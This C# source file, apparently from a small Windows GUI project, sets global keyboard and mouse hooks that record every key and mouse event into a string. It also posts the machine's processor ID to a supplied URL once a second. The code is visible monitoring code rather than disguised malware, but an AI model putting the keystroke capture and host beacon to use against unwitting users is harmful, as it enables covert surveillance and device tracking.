using ActionHook;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Management;

namespace GUI
{
    public class ConsoleApp2
    {
        private EventHookFactory eventHookFactory;
        private MouseWatcher mouseWatcher;
        private KeyboardWatcher keyboardWatcher;
        private string tmp_str = "";

        public ConsoleApp2(TextBox tb_keyboard, TextBox tb_mouse)
        {
            Console.WriteLine("New ConsoleApp2!");
            this.eventHookFactory = new EventHookFactory();

            this.keyboardWatcher = eventHookFactory.GetKeyboardWatcher();
            this.keyboardWatcher.OnKeyInput += (s, e) =>
            {
                string msg = $"Key {e.KeyData.EventType} event of key {e.KeyData.Keyname}";
                tb_keyboard.Text = msg;
                Console.WriteLine(msg);
                tmp_str += msg + "\n";
            };

            this.mouseWatcher = eventHookFactory.GetMouseWatcher();
            this.mouseWatcher.OnMouseInput += (s, e) =>
            {
                string msg = $"Mouse event {e.Message.ToString()} at point {e.Point.x},{e.Point.y}";
                tb_mouse.Text = msg;
                Console.WriteLine(msg);
                tmp_str += msg + "\n";
            };
        }

        public string run(Semaphore semaphore, string url)
        {
            Console.WriteLine("in ConsoleApp2.run()");
            tmp_str = "";
            keyboardWatcher.Start();
            mouseWatcher.Start();


            // 获得到信号量表示结束这一线程
            semaphore.WaitOne();
            keyboardWatcher.Stop();
            mouseWatcher.Stop();
            eventHookFactory.Dispose();

            return tmp_str;
        }

    }

    public class ScheduledReporter
    {
        async public static void Run(CancellationToken ct, string url)
        {
            // 示例发送HTTP报文
            Dictionary<string, string> dic = new Dictionary<string, string>();
            dic.Add("cpuid", Get_CPUID());
            dic.Add("a", "4");
            dic.Add("b", "2019");

            for (; ; )
            {
                await Task.Delay(1000);
                try
                {
                    ct.ThrowIfCancellationRequested();
                }
                catch (OperationCanceledException)
                { break; }
                try
                {
                    string responseBody = Post(url, dic);
                    Console.WriteLine(responseBody);
                }
                catch (System.Net.WebException)
                { }
            }
        }

        #region HTTP-post
        // 示例HTTP-post请求
        // ref: https://www.imooc.com/article/40178
        public static string Post(string url, Dictionary<string, string> dic)
        {
            string result = "";
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.ContentType = "application/x-www-form-urlencoded";
            #region 添加Post 参数  
            StringBuilder builder = new StringBuilder();
            int i = 0;
            foreach (var item in dic)
            {
                if (i > 0)
                    builder.Append("&");
                builder.AppendFormat("{0}={1}", item.Key, item.Value);
                i++;
            }
            byte[] data = Encoding.UTF8.GetBytes(builder.ToString());
            req.ContentLength = data.Length;
            using (Stream reqStream = req.GetRequestStream())
            {
                reqStream.Write(data, 0, data.Length);
                reqStream.Close();
            }
            #endregion
            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
            Stream stream = resp.GetResponseStream();
            //读出响应内容  
            using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
            {
                result = reader.ReadToEnd();
            }
            // Console.WriteLine(result); // print
            return result;
        }
        #endregion

        #region Get_CPUID
        // 获取CPUID，用以标志鶸
        // ref: https://blog.csdn.net/iilegend/article/details/75087638
        public static string Get_CPUID()
        {
            try
            {
                //需要在解决方案中引用System.Management.DLL文件  
                ManagementClass mc = new ManagementClass("Win32_Processor");
                ManagementObjectCollection moc = mc.GetInstances();
                string strCpuID = null;
                foreach (ManagementObject mo in moc)
                {
                    strCpuID = mo.Properties["ProcessorId"].Value.ToString();
                    mo.Dispose();
                    break;
                }
                return strCpuID;
            }
            catch
            {
                return "";
            }
        }
        #endregion
    }

}